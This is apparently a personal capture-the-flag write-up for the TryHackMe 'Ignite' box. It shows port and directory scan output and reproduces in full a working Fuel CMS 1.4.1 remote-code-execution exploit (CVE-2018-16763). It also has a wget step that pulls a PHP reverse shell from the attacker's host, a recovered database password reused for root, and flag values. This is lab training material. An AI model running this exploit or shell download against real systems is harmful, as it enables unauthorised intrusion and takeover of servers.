# Box Name
## ignite
---

## Overview
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---
# nmap
```
rustscan -r 1-65535 -a 10.10.10.53 --ulimit 9000 -- -sCV -oN nmap/initial.md
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 9000.
Open 10.10.10.53:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-11 13:21 UTC

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to FUEL CMS
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

```

# ferox
```

 ferox -u http://10.10.10.53 -w ~/SecLists/Discovery/Web-Content/common.txt -t 60 -x html,txt,php -C 403 -o logs/ferox.md   

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 1.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.53
 🚀  Threads               │ 60
 📖  Wordlist              │ /home/scott/SecLists/Discovery/Web-Content/common.txt
 🆗  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 🗑  Status Code Filters   │ [403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/1.10.3
 💾  Output File           │ logs/ferox.md
 💲  Extensions            │ [html, txt, php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 ⏯   Press [ENTER] to pause|resume your scan
──────────────────────────────────────────────────
301        9l       28w      311c http://10.10.10.53/assets
200      232l      986w        0c http://10.10.10.53/index
200      232l      986w        0c http://10.10.10.53/index.php
200      232l      986w        0c http://10.10.10.53/0
301        9l       28w      316c http://10.10.10.53/assets/docs
200       10l       12w      114c http://10.10.10.53/assets/docs/index.html
301        9l       28w      314c http://10.10.10.53/assets/js

```

# searchsploit fuel cms
- ### found 50477.py
```python

# Exploit Title: Fuel CMS 1.4.1 - Remote Code Execution (3)

# Exploit Author: Padsala Trushal

# Date: 2021-11-03

# Vendor Homepage: https://www.getfuelcms.com/

# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1

# Version: <= 1.4.1

# Tested on: Ubuntu - Apache2 - php5

# CVE : CVE-2018-16763

  

#!/usr/bin/python3

  

import requests

from urllib.parse import quote

import argparse

import sys

from colorama import Fore, Style

  

def get_arguments():

parser = argparse.ArgumentParser(description='fuel cms fuel CMS 1.4.1 - Remote Code Execution Exploit',usage=f'python3 {sys.argv[0]} -u <url>',epilog=f'EXAMPLE - python3 {sys.argv[0]} -u http://10.10.21.74')

  

parser.add_argument('-v','--version',action='version',version='1.2',help='show the version of exploit')

  

parser.add_argument('-u','--url',metavar='url',dest='url',help='Enter the url')

  

args = parser.parse_args()

  

if len(sys.argv) <=2:

parser.print_usage()

sys.exit()

  

return args

  
  

args = get_arguments()

url = args.url

  

if "http" not in url:

sys.stderr.write("Enter vaild url")

sys.exit()

  

try:

r = requests.get(url)

if r.status_code == 200:

print(Style.BRIGHT+Fore.GREEN+"[+]Connecting..."+Style.RESET_ALL)

  
  

except requests.ConnectionError:

print(Style.BRIGHT+Fore.RED+"Can't connect to url"+Style.RESET_ALL)

sys.exit()

  

while True:

cmd = input(Style.BRIGHT+Fore.YELLOW+"Enter Command $"+Style.RESET_ALL)

  

main_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+quote(cmd)+"%27%29%2b%27"

  

r = requests.get(main_url)

  

#<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">

  

output = r.text.split('<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">')

print(output[0])

if cmd == "exit":

break
```

- ## start a python http server
- ## start a nc listener
	- ### run python script
		- #### CMD: wget http://10.14.9.223:9001/shell.php
		- ### navagate to http://ignite/shell.php
		- ### get reverse shell on box

---
## Initial Foothold
---
# upload php revshell[[revshell]]
```
www-data@ubuntu:/home/www-data$ ls -la
total 12
drwx--x--x 2 www-data www-data 4096 Jul 26  2019 .
drwxr-xr-x 3 root     root     4096 Jul 26  2019 ..
-rw-r--r-- 1 root     root       34 Jul 26  2019 flag.txt
www-data@ubuntu:/home/www-data$ cat flag.txt 
6470e394cbf6dab6a91682cc8585059b

```

# linpeas output
```
╔══════════╣ Analyzing Backup Manager Files (limit 70)
storage.php Not Found

-rwxrwxrwx 1 root root 4646 Jul 26  2019 /var/www/html/fuel/application/config/database.php
|	['password'] The password used to connect to the database
|	['database'] The name of the database you want to connect to
	'password' => 'mememe',
	'database' => 'fuel_schema',


```
---
## Privilege Escalation
----
# /var/www/html/fuel/application/config/database.php
- ### this gives us roots password
	- #### su to root
	```bash
	www-data@ubuntu:/tmp$ su -
Password: 
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d
	```


# CVE-2021-4034
- ## vulerable to pwnkit
```bash

root@ubuntu:/root# ls -la
total 32
drwx------  4 root root 4096 Jul 26  2019 .
drwxr-xr-x 24 root root 4096 Jul 26  2019 ..
-rw-------  1 root root  386 Mar 11 12:44 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Feb 26  2019 .cache
drwxr-xr-x  2 root root 4096 Jul 26  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   34 Jul 26  2019 root.txt
root@ubuntu:/root# cat root.txt
b9bbcb33e11b80be759c4e844862482d 
```